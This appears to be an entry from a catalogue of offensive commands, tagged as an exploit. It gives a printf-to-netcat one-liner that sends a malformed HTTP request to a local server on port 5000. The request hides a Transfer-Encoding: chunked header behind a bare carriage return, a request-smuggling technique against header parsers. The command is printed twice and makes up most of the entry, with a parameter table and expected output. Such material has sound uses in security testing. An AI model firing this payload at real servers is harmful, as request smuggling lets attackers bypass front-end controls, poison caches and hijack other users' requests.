---
data: >-
  printf "POST / HTTP/1.1\r\n" "Host: localhost:5000\r\n"
  "X-Abc:\rxTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n"
  "\r\n" | nc localhost 5000
tags:
  - exploit
  - http
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: a983a65e-784b-4aa9-82f4-7e3f0e9eba07
created_at: '2025-12-13T09:01:17.650Z'
updated_at: '2025-12-13T09:01:17.650Z'
verified: false
validated: true
submitted: true
---
# Printf NC Send Crafted Request

## Command

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost:5000\r\n" "X-Abc:\rxTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Description

Crafts a malformed HTTP request with embedded CR to smuggle headers and sends it via netcat to a local server for exploiting parsing vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf` | Constructs the request string | Yes |
| `nc localhost 5000` | Sends to target port | Yes |
| `X-Abc` | Header with smuggled content | Yes |

## Examples

### Basic Usage

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost:5000\r\n" "X-Abc:\rxTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Expected Output

Server processes the request, logging smuggled headers and chunked body.

## Related

- [[procedures/Send-Crafted-HTTP-Request-for-Header-Smuggling]]
